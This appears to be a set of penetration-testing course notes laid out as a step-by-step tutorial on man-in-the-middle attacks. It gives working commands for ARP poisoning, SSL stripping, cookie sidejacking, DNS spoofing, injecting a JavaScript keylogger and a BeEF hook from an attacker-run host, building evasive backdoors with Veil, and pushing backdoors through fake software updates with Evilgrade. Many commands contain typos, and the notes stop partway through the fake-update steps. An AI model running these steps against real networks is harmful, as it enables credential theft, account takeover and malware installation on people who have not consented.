# Main In The Middle Attacks

### ARP Poisoning

This is one of the most dangerous and effective attacks that can be used to *redirect packets to and from any client to our device* and since we have the network key, we can read/modify/drop the packets. This allows us to launch very powerful attacks. It's very hard to protect against it as it exploits the insecure way that ARP works.

ARP security issues:
- Each ARP request/response is trusted.
- Clients can accept responses even if they did not send request.

**ARPSPOOF**

Arpspoof is a tool part of a suit called dnsiff, which contains a number of network penetration tools. Arpspoof can be used to launch a MITM and redirect traffic to flow through our device.

1. Command tell the  target client that I am the router.
```
arpspoof -i [interface] -t [target IP] [AP IP]
Ex: arpsoof -i wlan0 -t 192.168.1.5 192.168.1.1
````

2. Command tell the AP that I am the target client.
```
aprspoof -i [interface] -t [AP IP][target IP]
Ex: arpsoof -i wlan0 -t 192.168.1.1 192.168.1.5
```

3. Enable IP forward to allow packets to flow through our device without being dropped.
`Echo 1> /proc/sys/net/ipv4/ip_froward`

## MAN IN THE MIDDLE FRAMEWORK (MITMf)

MITMf is a framework that allows to launch a number of MITM attacks. MITMf also starts SSLstrip automatically to bypass HTTPS/SSL.

```
mitmf-arp-spoof-gateway [GATEWAY IP] --targets [TARGET IPs] -i [interface]
Ex: mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 - eth0/wlan0
```

`echo 1 > /proc/sys/net/ipv4/ip_forward`

If you get error like `Import Error: No module named bdfactory` then you have to install first **the-backdoor-factory** module.

`https://github.com/secretsquirrel/the-backdoor-factory`

`apt-get update`
`apt-get install backdoor-factory`

If you get this error agian then you have to isntall manually.

```
git clone https://github.com/secretsquirrel/the-backdoor-factory.git
mkdir /usr/share/mitmf/bdfactory
cd the-backdoor-factory
cp -r ./* /usr/share/mitmf/bdfactory/ 
cd /usr/share/mitmf/bdfactory
```
### Bypassing HTTPS

Most of the website use https in their registration pages. These pages are validated using an SSL certificate and there for will show a warning to the user that the certificate is valaid. SSLstrip is a tool that can be used to downgrade HTTPs requests to HTTP allowing us to sniff passwords without displaying a warning to the user.

*Note: MITMf starts SSLstrip.*

### Session Hijacking

If the user uses this feature hte authentication happens using the cookies and not the user and password. So instead of sniffing the password we can sniff the cookies and inject them into our browser, this will allows us to login to the user's account without using the password.

`apt-get intall ferret-sidejack`

`ferret -i [interface]`

`hamster`

### DNS Spoofing

DNS Spoofing allows us to refirect any request to a certain domain to another domain. We have to run apache server.

`service apache2 start`

1. Edit DNS settings.

`leafpad /etc/mitmf/mitmf.conf`

2. Run ettercap to arp poison target (s) and enable the dns_spoof plugin.

```
mitmf --arp --spoof --gateway [GATEWAY IP] --targets [TARGET IP] -i eth0/wlan0 --dns
Ex: mithf --arp --spoof --gateway [10.20.14.1] --targets [10.20.14.216] -i eth0/wlan0 --dns
```

### Capturing Screen of Target & Injecting a Keylogger

Default Interval 10s
```
mitmf --arp --spoof --gateway [GATEWAY IP] --targets [TARGET IP] -i eth0/wlan0 --screen
Ex: mithf --arp --spoof --gateway [10.20.14.1] --targets [10.20.14.216] -i eth0/wlan0 --screen

mitmf --arp --spoof --gateway [GATEWAY IP] --targets [TARGET IP] -i eth0/wlan0 --screen --interval 5
Ex: mithf --arp --spoof --gateway [10.20.14.1] --targets [10.20.14.216] -i eth0/wlan0 --screen --interval 5
```

```
mitmf --arp --spoof --gateway [GATEWAY IP] --targets [TARGET IP] -i eth0/wlan0 --jskeylogger
Ex: mithf --arp --spoof --gateway [10.20.14.1] --targets [10.20.14.216] -i eth0/wlan0 --jskeylogger
```

Note: If you get *AttributeError: ClientRequest instance has no attribute 'headers'* this error then you have to install *twisted* python module.

`pip install Twisted==15.5.0`

## Beef Framework

Browser Exploitation Framework allowing us to launch a number of attacks on a hooked target. Target are hooked once they load a hook url.

- DNS spoof requests to a page containing a hook
- Inject the hook in browser pages (need to be MITM)

### Hooking Clients To Beef & Stealing Passwords

First run **Beef** tools. Its a default pentesting tool in kali. Login hook. Its username and password is beef.

Then we will **mitmf** using this command:

```
mitmf --arp --spoof --gateway [GATEWAY IP] --targets [TARGET IP] -i eth0/wlan0 --inject --js-url http://
mitmf --arp --spoof --gateway 10.20.14.1 --target 10.20.14.216 -i wlan0 --inject --js-url http://10.20.14.203:3000/hook.js
```

## WIRESHARK

Wireshark is a network protocol analyser tool. Designed to help network administrators to keep track of what is happening in their network. Its not designed for hackers or hacking but a hacker knows how to use network tools for there own purpose.

How it works?

- Logs packets that flow through the slelected interface.
- Analyse all the packets.

*When we are the MITM, sireshark can be used to sniff and analyse traffic sent/received by targes.*

## Generating An Undetecttable Backdoor

- Install veil-evasion			`apt-get install veil-evasion`
- Run veil-evasion				`veil`
- Select a backdoor / payload	`use [payload number]`
- Set options					`set [option] [value]`
- Generate Backdoor				`generate`

## CREATE A FAKE UPDATE

- Fake an update for an already installed program.
- Install backdoor instead of the update.
- Requires DNS spoofing + Evilgrade (a server to server the update).

1. Download and install Evilgrade using the instructions in the resources.

2. Start evilgrade.

`evilgrade`

3. Check program then can be hijacked.

`show modules`

4. Select one.

`configure [module]`

5. Set backdoor location.

`set agent [agent location]`

6. Start server

`start`

7. Start dns spoofing and handler.
